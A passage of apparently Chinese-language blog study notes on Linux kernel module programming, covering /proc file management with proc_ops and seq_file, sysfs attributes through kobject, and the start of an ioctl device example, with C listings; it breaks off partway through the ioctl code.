<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sh -c &#x27;echo &quot;I LOVE YOU&quot; &gt; /proc/bufferlk&#x27;</span><br><span class="line">❯ cat /proc/bufferlk</span><br></pre></td></tr></table></figure>

<p>![截图 2024-01-15 10-34-28](&#x2F;img&#x2F;posts&#x2F;2024-1-4-LKM编程学习.assets&#x2F;截图 2024-01-15 10-34-28.png)</p>
<h3 id="5-3-Manage-proc-file-with-standard-filesystem"><a href="#5-3-Manage-proc-file-with-standard-filesystem" class="headerlink" title="5.3 Manage &#x2F;proc file with standard filesystem"></a>5.3 Manage &#x2F;proc file with standard filesystem</h3><p>还可以使用inode来管理&#x2F;proc文件，好处是可以使用一些高级函数，例如权限。</p>
<p>Linux系统中，对于文件系统注册有一套标准的方法。因为每一个文件系统都有它自己的操作函数来管理inode和文件操作，需要一个结构体来指向这些函数，结构体<code>struct inode_operations</code>，该结构体包含<code>proc_ops</code>。</p>
<p>文件操作与inode操作的区别在于，文件操作处理文件本身，而inode操作处理引用文件的方式，例如创建到该文件的链接。</p>
<p>还有个函数<code>module_permission</code>。当进程要对&#x2F;proc文件进行操作时会先调用此函数，查看是否有权限来进行操作。</p>
<p>注：内核的read和write函数的作用与正常程序相反，read函数用于输出，write函数用于输入。因为如果进程要从内核中读取数据，内核需要输出，写入数据时，内核是接受数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * procfs3.c </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5, 10, 0) </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/minmax.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5, 6, 0) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HAVE_PROC_OPS </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCFS_MAX_SIZE 2048UL </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCFS_ENTRY_FILENAME <span class="string">&quot;buffer2k&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">our_proc_file</span>;</span> </span><br><span class="line"><span class="type">static</span> <span class="type">char</span> procfs_buffer[PROCFS_MAX_SIZE]; </span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> procfs_buffer_size = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">procfs_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buffer, </span></span><br><span class="line"><span class="params">                           <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">if</span> (*offset || procfs_buffer_size == <span class="number">0</span>) &#123; </span><br><span class="line">        pr_debug(<span class="string">&quot;procfs_read: END\n&quot;</span>); </span><br><span class="line">        *offset = <span class="number">0</span>; </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    procfs_buffer_size = min(procfs_buffer_size, length); </span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(buffer, procfs_buffer, procfs_buffer_size)) </span><br><span class="line">        <span class="keyword">return</span> -EFAULT; </span><br><span class="line">    *offset += procfs_buffer_size; </span><br><span class="line"> </span><br><span class="line">    pr_debug(<span class="string">&quot;procfs_read: read %lu bytes\n&quot;</span>, procfs_buffer_size); </span><br><span class="line">    <span class="keyword">return</span> procfs_buffer_size; </span><br><span class="line">&#125; </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">procfs_write</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> __user *buffer, </span></span><br><span class="line"><span class="params">                            <span class="type">size_t</span> len, <span class="type">loff_t</span> *off)</span> </span><br><span class="line">&#123; </span><br><span class="line">    procfs_buffer_size = min(PROCFS_MAX_SIZE, len); </span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(procfs_buffer, buffer, procfs_buffer_size)) </span><br><span class="line">        <span class="keyword">return</span> -EFAULT; </span><br><span class="line">    *off += procfs_buffer_size; </span><br><span class="line"> </span><br><span class="line">    pr_debug(<span class="string">&quot;procfs_write: write %lu bytes\n&quot;</span>, procfs_buffer_size); </span><br><span class="line">    <span class="keyword">return</span> procfs_buffer_size; </span><br><span class="line">&#125; </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">procfs_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    try_module_get(THIS_MODULE); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">procfs_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    module_put(THIS_MODULE); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_PROC_OPS </span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">file_ops_4_our_proc_file</span> =</span> &#123; </span><br><span class="line">    .proc_read = procfs_read, </span><br><span class="line">    .proc_write = procfs_write, </span><br><span class="line">    .proc_open = procfs_open, </span><br><span class="line">    .proc_release = procfs_close, </span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">file_ops_4_our_proc_file</span> =</span> &#123; </span><br><span class="line">    .read = procfs_read, </span><br><span class="line">    .write = procfs_write, </span><br><span class="line">    .open = procfs_open, </span><br><span class="line">    .release = procfs_close, </span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">procfs3_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    our_proc_file = proc_create(PROCFS_ENTRY_FILENAME, <span class="number">0644</span>, <span class="literal">NULL</span>, </span><br><span class="line">                                &amp;file_ops_4_our_proc_file); </span><br><span class="line">    <span class="keyword">if</span> (our_proc_file == <span class="literal">NULL</span>) &#123; </span><br><span class="line">        pr_debug(<span class="string">&quot;Error: Could not initialize /proc/%s\n&quot;</span>, </span><br><span class="line">                 PROCFS_ENTRY_FILENAME); </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM; </span><br><span class="line">    &#125; </span><br><span class="line">    proc_set_size(our_proc_file, <span class="number">80</span>); </span><br><span class="line">    proc_set_user(our_proc_file, GLOBAL_ROOT_UID, GLOBAL_ROOT_GID); </span><br><span class="line"> </span><br><span class="line">    pr_debug(<span class="string">&quot;/proc/%s created\n&quot;</span>, PROCFS_ENTRY_FILENAME); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">procfs3_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    remove_proc_entry(PROCFS_ENTRY_FILENAME, <span class="literal">NULL</span>); </span><br><span class="line">    pr_debug(<span class="string">&quot;/proc/%s removed\n&quot;</span>, PROCFS_ENTRY_FILENAME); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(procfs3_init); </span><br><span class="line">module_exit(procfs3_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/img/posts/2024-1-4-LKM%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0.assets/image-20240115143522039.png" alt="image-20240115143522039"></p>
<h3 id="5-4-Manage-proc-file-with-seq-file"><a href="#5-4-Manage-proc-file-with-seq-file" class="headerlink" title="5.4 Manage &#x2F;proc file with seq_file"></a>5.4 Manage &#x2F;proc file with seq_file</h3><p>前面的构建&#x2F;proc文件过程比较复杂。因此为了更方便的写&#x2F;proc文件，提供了<code>seq_file</code>api用于格式化&#x2F;proc文件。<code>seq_file</code>根据时序分为三个函数: <code>start()</code>, <code>next()</code>, <code>stop()</code>。当用户读取&#x2F;proc文件时，<code>seq_file</code>会新建一个时序。</p>
<p>时序以<code>start()</code>为开始。如果返回值不为空，则继续调用<code>next()</code>函数。该函数为一个迭代器，可以遍历所有的数据。每次<code>next()</code>函数调用，都会调用<code>show()</code>函数。<code>show()</code>函数会在用户读取的缓冲区中写入数据值。当函数返回空值后结束循环。然后<code>stop()</code>函数被调用。<code>stop()</code>函数调用结束后，会继续调用<code>start()</code>函数，直到<code>start()</code>函数返回空值结束。</p>
<p><img src="/img/posts/2024-1-4-LKM%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0.assets/lkmpg-for-ht1x-1705301053942-4.svg" alt="lkmpg-for-ht1x"></p>
<p>注：<code>seq_file</code>为<code>proc_ops</code>提供了基本的函数，例如<code>seq_read</code>, <code>seq_lseek</code>等。但是没有写入的函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * procfs4.c -  create a &quot;file&quot; in /proc </span></span><br><span class="line"><span class="comment"> * This program uses the seq_file library to manage the /proc file. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span> <span class="comment">/* We are doing kernel work */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> <span class="comment">/* Specifically, a module */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span> <span class="comment">/* Necessary because we use proc fs */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seq_file.h&gt;</span> <span class="comment">/* for seq_file */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5, 6, 0) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HAVE_PROC_OPS </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROC_NAME <span class="string">&quot;iter&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called at the beginning of a sequence. </span></span><br><span class="line"><span class="comment"> * ie, when: </span></span><br><span class="line"><span class="comment"> *   - the /proc file is read (first time) </span></span><br><span class="line"><span class="comment"> *   - after the function stop (end of sequence) </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">my_seq_start</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">loff_t</span> *pos)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> counter = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* beginning a new sequence? */</span> </span><br><span class="line">    <span class="keyword">if</span> (*pos == <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="comment">/* yes =&gt; return a non null value to begin the sequence */</span> </span><br><span class="line">        <span class="keyword">return</span> &amp;counter; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* no =&gt; it is the end of the sequence, return end to stop reading */</span> </span><br><span class="line">    *pos = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called after the beginning of a sequence. </span></span><br><span class="line"><span class="comment"> * It is called until the return is NULL (this ends the sequence). </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">my_seq_next</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *tmp_v = (<span class="type">unsigned</span> <span class="type">long</span> *)v; </span><br><span class="line">    (*tmp_v)++; </span><br><span class="line">    (*pos)++; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called at the end of a sequence. */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_seq_stop</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">/* nothing to do, we use a static value in start() */</span> </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called for each &quot;step&quot; of a sequence. */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_seq_show</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">loff_t</span> *spos = (<span class="type">loff_t</span> *)v; </span><br><span class="line"> </span><br><span class="line">    seq_printf(s, <span class="string">&quot;%Ld\n&quot;</span>, *spos); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This structure gather &quot;function&quot; to manage the sequence */</span> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> <span class="title">my_seq_ops</span> =</span> &#123; </span><br><span class="line">    .start = my_seq_start, </span><br><span class="line">    .next = my_seq_next, </span><br><span class="line">    .stop = my_seq_stop, </span><br><span class="line">    .show = my_seq_show, </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called when the /proc file is open. */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">return</span> seq_open(file, &amp;my_seq_ops); </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This structure gather &quot;function&quot; that manage the /proc file */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_PROC_OPS </span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">my_file_ops</span> =</span> &#123; </span><br><span class="line">    .proc_open = my_open, </span><br><span class="line">    .proc_read = seq_read, </span><br><span class="line">    .proc_lseek = seq_lseek, </span><br><span class="line">    .proc_release = seq_release, </span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">my_file_ops</span> =</span> &#123; </span><br><span class="line">    .open = my_open, </span><br><span class="line">    .read = seq_read, </span><br><span class="line">    .llseek = seq_lseek, </span><br><span class="line">    .release = seq_release, </span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">procfs4_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">entry</span>;</span> </span><br><span class="line"> </span><br><span class="line">    entry = proc_create(PROC_NAME, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;my_file_ops); </span><br><span class="line">    <span class="keyword">if</span> (entry == <span class="literal">NULL</span>) &#123; </span><br><span class="line">        pr_debug(<span class="string">&quot;Error: Could not initialize /proc/%s\n&quot;</span>, PROC_NAME); </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">procfs4_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    remove_proc_entry(PROC_NAME, <span class="literal">NULL</span>); </span><br><span class="line">    pr_debug(<span class="string">&quot;/proc/%s removed\n&quot;</span>, PROC_NAME); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(procfs4_init); </span><br><span class="line">module_exit(procfs4_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="Chapter-6-Interacting-with-your-module"><a href="#Chapter-6-Interacting-with-your-module" class="headerlink" title="Chapter 6 Interacting with your module"></a>Chapter 6 Interacting with your module</h2><p><code>sysfs</code>可以实现在用户空间通过在模块中读取或设置变量与运行的内核进行交互。查看系统的<code>sysfs</code>目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /sys</span><br></pre></td></tr></table></figure>

<p><img src="/img/posts/2024-1-4-LKM%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0.assets/image-20240115145741324.png" alt="image-20240115145741324"></p>
<p>可以在文件系统中以常规文件的形式为kobjects导出属性。Sysfs将文件I&#x2F;O操作转发给为属性定义的方法，提供了提供了读写内核属性的方法。</p>
<p>一个属性的简单定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attribute</span> &#123;</span> </span><br><span class="line">    <span class="type">char</span> *name; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span> </span><br><span class="line">    <span class="type">umode_t</span> mode; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">sysfs_create_file</span><span class="params">(<span class="keyword">struct</span> kobject * kobj, <span class="type">const</span> <span class="keyword">struct</span> attribute * attr)</span>; </span><br><span class="line"><span class="type">void</span> <span class="title function_">sysfs_remove_file</span><span class="params">(<span class="keyword">struct</span> kobject * kobj, <span class="type">const</span> <span class="keyword">struct</span> attribute * attr)</span>;</span><br></pre></td></tr></table></figure>

<p>例如，设备驱动模型定义了<code>device_attribute</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device_attribute</span> &#123;</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attribute</span> <span class="title">attr</span>;</span> </span><br><span class="line">    <span class="type">ssize_t</span> (*show)(<span class="keyword">struct</span> device *dev, <span class="keyword">struct</span> device_attribute *attr, </span><br><span class="line">                    <span class="type">char</span> *buf); </span><br><span class="line">    <span class="type">ssize_t</span> (*store)(<span class="keyword">struct</span> device *dev, <span class="keyword">struct</span> device_attribute *attr, </span><br><span class="line">                    <span class="type">const</span> <span class="type">char</span> *buf, <span class="type">size_t</span> count); </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">device_create_file</span><span class="params">(<span class="keyword">struct</span> device *, <span class="type">const</span> <span class="keyword">struct</span> device_attribute *)</span>; </span><br><span class="line"><span class="type">void</span> <span class="title function_">device_remove_file</span><span class="params">(<span class="keyword">struct</span> device *, <span class="type">const</span> <span class="keyword">struct</span> device_attribute *)</span>;</span><br></pre></td></tr></table></figure>

<p>为了读写attributes，show()和store()方法必须声明定义。一般情况下include&#x2F;linux&#x2F;sysfs.h提供了便捷的宏用来简化定义。</p>
<p>以下为一个hello world模块，通过sysfs实现了创建一个可以访问的变量。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * hello-sysfs.c sysfs example </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kobject.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sysfs.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> *<span class="title">mymodule</span>;</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* the variable you want to be able to change */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> myvariable = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">myvariable_show</span><span class="params">(<span class="keyword">struct</span> kobject *kobj, </span></span><br><span class="line"><span class="params">                               <span class="keyword">struct</span> kobj_attribute *attr, <span class="type">char</span> *buf)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;%d\n&quot;</span>, myvariable); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">myvariable_store</span><span class="params">(<span class="keyword">struct</span> kobject *kobj, </span></span><br><span class="line"><span class="params">                                <span class="keyword">struct</span> kobj_attribute *attr, <span class="type">char</span> *buf, </span></span><br><span class="line"><span class="params">                                <span class="type">size_t</span> count)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%du&quot;</span>, &amp;myvariable); </span><br><span class="line">    <span class="keyword">return</span> count; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kobj_attribute</span> <span class="title">myvariable_attribute</span> =</span> </span><br><span class="line">    __ATTR(myvariable, <span class="number">0660</span>, myvariable_show, (<span class="type">void</span> *)myvariable_store); </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mymodule_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> error = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line">    pr_info(<span class="string">&quot;mymodule: initialised\n&quot;</span>); </span><br><span class="line"> </span><br><span class="line">    mymodule = kobject_create_and_add(<span class="string">&quot;mymodule&quot;</span>, kernel_kobj); </span><br><span class="line">    <span class="keyword">if</span> (!mymodule) </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM; </span><br><span class="line"> </span><br><span class="line">    error = sysfs_create_file(mymodule, &amp;myvariable_attribute.attr); </span><br><span class="line">    <span class="keyword">if</span> (error) &#123; </span><br><span class="line">        pr_info(<span class="string">&quot;failed to create the myvariable file &quot;</span> </span><br><span class="line">                <span class="string">&quot;in /sys/kernel/mymodule\n&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> error; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mymodule_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    pr_info(<span class="string">&quot;mymodule: Exit success\n&quot;</span>); </span><br><span class="line">    kobject_put(mymodule); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(mymodule_init); </span><br><span class="line">module_exit(mymodule_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>效果图如下，成功实现对sys文件下模块的变量的读写。</p>
<p><img src="/img/posts/2024-1-4-LKM%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0.assets/image-20240115150838900.png" alt="image-20240115150838900"></p>
<p>以上情况下，使用了kobject来创建sysfs下的目录，并与其下的属性文件进行信息交互。<strong>kobject</strong>起初用于统一内核代码的简单方法，用于管理引用计数对象，目前时将设备驱动与sysfs接口联系在一起的粘合剂。</p>
<h2 id="Chapter-7-Talking-To-Device-Files"><a href="#Chapter-7-Talking-To-Device-Files" class="headerlink" title="Chapter 7. Talking To Device Files"></a>Chapter 7. Talking To Device Files</h2><h3 id="7-1-Talking-to-Device-Files-write-and-IOCTLS"><a href="#7-1-Talking-to-Device-Files-write-and-IOCTLS" class="headerlink" title="7.1 Talking to Device Files (write and IOCTLS)"></a>7.1 Talking to Device Files (write and IOCTLS)</h3><p>设备文件（&#x2F;dev目录包含了所有linux中使用的外部设备，但是不包含外部设备的驱动信息，外舍驱动在&#x2F;kernel&#x2F;drivers）代表了物理设备。大多数的设备既有输入也有输出，因此需要一些方法令内核中的设备驱动从进程中获取输出发送给设备，通过打开设备文件并写入实现。下面例子实现了device_write。</p>
<p>当然只有这些写入操作还不够，假设有场景需要串口与解调器通信，可以通过读写设备文件实现消息的接受与发送，<strong>但是应该如何与串口本身通信是一个问题</strong>，例如波特率等配置信息。</p>
<p>Unix系统提供了<code>ioctl（Input Output Control）</code>函数，每个设备都有自己的ioctl命令，可以读取（从进程发送信息到内核），写入（从内核返回信息到进程）等。</p>
<p><code>ioctl</code>函数有三个参数：合适的设备文件描述符，<code>ioctl</code>数，参数（long型）可以强制转换来传递任何内容。可以传递结构体指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * ioctl.c </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioctl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ioctl_arg</span> &#123;</span> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> val; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Documentation/userspace-api/ioctl/ioctl-number.rst */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOC_MAGIC <span class="string">&#x27;\x66&#x27;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VALSET _IOW(IOC_MAGIC, 0, struct ioctl_arg) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VALGET _IOR(IOC_MAGIC, 1, struct ioctl_arg) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VALGET_NUM _IOR(IOC_MAGIC, 2, int) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VALSET_NUM _IOW(IOC_MAGIC, 3, int) </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span 